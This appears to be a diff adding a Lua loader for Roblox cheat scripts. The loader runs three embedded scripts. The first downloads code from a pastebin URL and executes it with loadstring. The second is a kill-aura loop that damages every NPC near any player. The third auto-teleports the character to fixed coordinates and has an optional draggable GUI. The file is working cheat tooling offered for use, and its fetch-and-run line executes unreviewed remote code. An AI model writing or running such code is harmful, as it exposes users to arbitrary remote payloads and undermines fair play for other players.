@@ -1,0 +1,531 @@
+local script1 = [[
+loadstring(game:HttpGet("https://pastebin.com/raw/TV83kUPv", true))()
+]]
+
+local script2 = [[
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local RANGE = 250
+local DAMAGE = 1000
+local INTERVAL = 0.2
+
+local function getRoot(character)
+	return character and character:FindFirstChild("HumanoidRootPart")
+end
+
+local function damageNearbyNPCs(player)
+	local character = player.Character
+	local root = getRoot(character)
+
+	if not root then
+		return
+	end
+
+	local npcFolder = workspace:FindFirstChild("NPCs")
+	if not npcFolder then
+		return
+	end
+
+	for _, npc in ipairs(npcFolder:GetChildren()) do
+		if npc:IsA("Model") then
+			local humanoid = npc:FindFirstChildOfClass("Humanoid")
+			local npcRoot =
+				npc:FindFirstChild("HumanoidRootPart")
+				or npc.PrimaryPart
+
+			if humanoid
+				and npcRoot
+				and humanoid.Health > 0 then
+
+				local distance =
+					(npcRoot.Position - root.Position).Magnitude
+
+				if distance <= RANGE then
+					humanoid:TakeDamage(DAMAGE)
+				end
+			end
+		end
+	end
+end
+
+task.spawn(function()
+	while true do
+		for _, player in ipairs(Players:GetPlayers()) do
+			damageNearbyNPCs(player)
+		end
+
+		task.wait(INTERVAL)
+	end
+end)
+]]
+
+local script3 = [[
+--========================================================
+-- COORDINATE TELEPORTER
+--========================================================
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+--========================================================
+-- CONFIG
+--========================================================
+
+local AUTO_TELEPORT = true
+local SHOW_GUI = false
+
+-- CHANGE THESE WHENEVER YOU WANT
+local AUTO_X = 701.421
+local AUTO_Y = 2011.231
+local AUTO_Z = 83592.812
+
+-- Automatically try to find ground underneath the target
+local FIND_GROUND = true
+
+-- How far above the ground to place the character
+local GROUND_OFFSET = 4
+
+-- How far the ground raycast searches
+local GROUND_RAY_HEIGHT = 500
+local GROUND_RAY_DEPTH = 1500
+
+local GUI_NAME = "CoordinateTeleporter"
+
+--========================================================
+-- CHARACTER
+--========================================================
+
+local function getCharacter()
+	local character = player.Character
+
+	if not character then
+		return nil, nil
+	end
+
+	local root = character:FindFirstChild("HumanoidRootPart")
+
+	return character, root
+end
+
+--========================================================
+-- GROUND FINDER
+--========================================================
+
+local function findGround(position, character)
+
+	local rayOrigin =
+		position + Vector3.new(0, GROUND_RAY_HEIGHT, 0)
+
+	local rayDirection =
+		Vector3.new(0, -GROUND_RAY_DEPTH, 0)
+
+	local params = RaycastParams.new()
+
+	params.FilterType = Enum.RaycastFilterType.Exclude
+	params.FilterDescendantsInstances = {character}
+
+	local result = workspace:Raycast(
+		rayOrigin,
+		rayDirection,
+		params
+	)
+
+	if result then
+		return result.Position
+	end
+
+	return nil
+end
+
+--========================================================
+-- TELEPORT FUNCTION
+--========================================================
+
+local function teleportTo(position)
+
+	local character, root = getCharacter()
+
+	if not character or not root then
+		return false, "Character not found"
+	end
+
+	-- First go to requested coordinates
+	character:PivotTo(CFrame.new(position))
+
+	root.AssemblyLinearVelocity = Vector3.zero
+	root.AssemblyAngularVelocity = Vector3.zero
+
+	-- Try finding ground
+	if FIND_GROUND then
+
+		task.wait(0.05)
+
+		local ground = findGround(position, character)
+
+		if ground then
+
+			local safePosition =
+				ground + Vector3.new(0, GROUND_OFFSET, 0)
+
+			character:PivotTo(
+				CFrame.new(safePosition)
+			)
+
+			root.AssemblyLinearVelocity = Vector3.zero
+			root.AssemblyAngularVelocity = Vector3.zero
+
+			return true, safePosition
+		end
+	end
+
+	return true, position
+end
+
+--========================================================
+-- AUTO TELEPORT
+--========================================================
+
+if AUTO_TELEPORT then
+
+	task.spawn(function()
+
+		-- Wait for character
+		local character, root
+
+		repeat
+			task.wait()
+			character, root = getCharacter()
+		until character and root
+
+		task.wait(0.1)
+
+		local target = Vector3.new(
+			AUTO_X,
+			AUTO_Y,
+			AUTO_Z
+		)
+
+		local success, result = teleportTo(target)
+
+		if success then
+			print(
+				"[Coordinate Teleporter] Auto teleported to:",
+				result
+			)
+		else
+			warn(
+				"[Coordinate Teleporter]",
+				result
+			)
+		end
+
+	end)
+
+end
+
+--========================================================
+-- GUI
+--========================================================
+
+if not SHOW_GUI then
+	print("[Coordinate Teleporter] GUI disabled")
+	return
+end
+
+-- Remove previous GUI
+local oldGui = playerGui:FindFirstChild(GUI_NAME)
+
+if oldGui then
+	oldGui:Destroy()
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = GUI_NAME
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = playerGui
+
+--========================================================
+-- MAIN FRAME
+--========================================================
+
+local frame = Instance.new("Frame")
+frame.Name = "MainFrame"
+frame.Size = UDim2.fromOffset(360, 205)
+frame.Position = UDim2.new(0.5, -180, 0.5, -102)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Parent = gui
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 9)
+frameCorner.Parent = frame
+
+--========================================================
+-- TITLE BAR
+--========================================================
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 36)
+titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+titleBar.BorderSizePixel = 0
+titleBar.Active = true
+titleBar.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.fromOffset(10, 0)
+title.BackgroundTransparency = 1
+title.Text = "Coordinate Teleporter"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextSize = 16
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+--========================================================
+-- COORDINATE BOX
+--========================================================
+
+local coordBox = Instance.new("TextBox")
+coordBox.Size = UDim2.new(1, -20, 0, 40)
+coordBox.Position = UDim2.fromOffset(10, 47)
+coordBox.BackgroundColor3 = Color3.fromRGB(50, 50, 56)
+coordBox.BorderSizePixel = 0
+coordBox.TextColor3 = Color3.new(1, 1, 1)
+coordBox.PlaceholderText = "X, Y, Z"
+coordBox.PlaceholderColor3 = Color3.fromRGB(145, 145, 145)
+
+coordBox.Text = string.format(
+	"%.3f, %.3f, %.3f",
+	AUTO_X,
+	AUTO_Y,
+	AUTO_Z
+)
+
+coordBox.TextSize = 14
+coordBox.Font = Enum.Font.Gotham
+coordBox.ClearTextOnFocus = false
+coordBox.TextXAlignment = Enum.TextXAlignment.Center
+coordBox.Parent = frame
+
+local boxCorner = Instance.new("UICorner")
+boxCorner.CornerRadius = UDim.new(0, 6)
+boxCorner.Parent = coordBox
+
+--========================================================
+-- STATUS
+--========================================================
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, -20, 0, 25)
+status.Position = UDim2.fromOffset(10, 91)
+status.BackgroundTransparency = 1
+status.Text = AUTO_TELEPORT and "Auto teleport enabled" or "Ready"
+status.TextColor3 = Color3.fromRGB(190, 190, 190)
+status.TextSize = 12
+status.Font = Enum.Font.Gotham
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = frame
+
+--========================================================
+-- GET POSITION
+--========================================================
+
+local getButton = Instance.new("TextButton")
+getButton.Size = UDim2.fromOffset(165, 38)
+getButton.Position = UDim2.fromOffset(10, 122)
+getButton.BackgroundColor3 = Color3.fromRGB(65, 65, 135)
+getButton.BorderSizePixel = 0
+getButton.Text = "Get Position"
+getButton.TextColor3 = Color3.new(1, 1, 1)
+getButton.TextSize = 14
+getButton.Font = Enum.Font.GothamBold
+getButton.Parent = frame
+
+local getCorner = Instance.new("UICorner")
+getCorner.CornerRadius = UDim.new(0, 6)
+getCorner.Parent = getButton
+
+--========================================================
+-- TELEPORT BUTTON
+--========================================================
+
+local tpButton = Instance.new("TextButton")
+tpButton.Size = UDim2.fromOffset(165, 38)
+tpButton.Position = UDim2.fromOffset(185, 122)
+tpButton.BackgroundColor3 = Color3.fromRGB(60, 130, 70)
+tpButton.BorderSizePixel = 0
+tpButton.Text = "Teleport"
+tpButton.TextColor3 = Color3.new(1, 1, 1)
+tpButton.TextSize = 14
+tpButton.Font = Enum.Font.GothamBold
+tpButton.Parent = frame
+
+local tpCorner = Instance.new("UICorner")
+tpCorner.CornerRadius = UDim.new(0, 6)
+tpCorner.Parent = tpButton
+
+--========================================================
+-- PARSE COORDINATES
+--========================================================
+
+local function parseCoordinates(text)
+
+	local x, y, z = text:match(
+		"^%s*([%+%-]?[%d%.]+)%s*,%s*([%+%-]?[%d%.]+)%s*,%s*([%+%-]?[%d%.]+)%s*$"
+	)
+
+	if not x or not y or not z then
+		return nil
+	end
+
+	return Vector3.new(
+		tonumber(x),
+		tonumber(y),
+		tonumber(z)
+	)
+end
+
+--========================================================
+-- GET POSITION BUTTON
+--========================================================
+
+getButton.Activated:Connect(function()
+
+	local character, root = getCharacter()
+
+	if not root then
+		status.Text = "Character not found"
+		return
+	end
+
+	local p = root.Position
+
+	coordBox.Text = string.format(
+		"%.3f, %.3f, %.3f",
+		p.X,
+		p.Y,
+		p.Z
+	)
+
+	status.Text = "Position captured"
+
+end)
+
+--========================================================
+-- TELEPORT BUTTON
+--========================================================
+
+tpButton.Activated:Connect(function()
+
+	local target = parseCoordinates(coordBox.Text)
+
+	if not target then
+		status.Text = "Invalid coordinates"
+		return
+	end
+
+	status.Text = "Teleporting..."
+
+	local success, result = teleportTo(target)
+
+	if success then
+		status.Text = "Teleported"
+	else
+		status.Text = tostring(result)
+	end
+
+end)
+
+--========================================================
+-- DRAGGING
+--========================================================
+
+local dragging = false
+local dragStart
+local startPosition
+
+titleBar.InputBegan:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = true
+		dragStart = input.Position
+		startPosition = frame.Position
+	end
+
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+
+	if not dragging then
+		return
+	end
+
+	if input.UserInputType ~= Enum.UserInputType.MouseMovement
+		and input.UserInputType ~= Enum.UserInputType.Touch then
+		return
+	end
+
+	local delta = input.Position - dragStart
+
+	frame.Position = UDim2.new(
+		startPosition.X.Scale,
+		startPosition.X.Offset + delta.X,
+
+		startPosition.Y.Scale,
+		startPosition.Y.Offset + delta.Y
+	)
+
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = false
+	end
+
+end)
+
+print("[Coordinate Teleporter] Loaded")
+]]
+
+local function run(code, name)
+	print("Starting " .. name)
+
+	if code:match("^%s*$") then
+		print(name .. " is empty, skipping")
+		return
+	end
+
+	local fn, err = loadstring(code)
+
+	if not fn then
+		warn(name .. " compile error:", err)
+		return
+	end
+
+	local success, result = pcall(fn)
+
+	if not success then
+		warn(name .. " runtime error:", result)
+		return
+	end
+
+	print(name .. " loaded")
+end
+
+run(script1, "Script 1")
+run(script2, "Script 2")
+run(script3, "Script 3")
+
+print("All scripts finished")
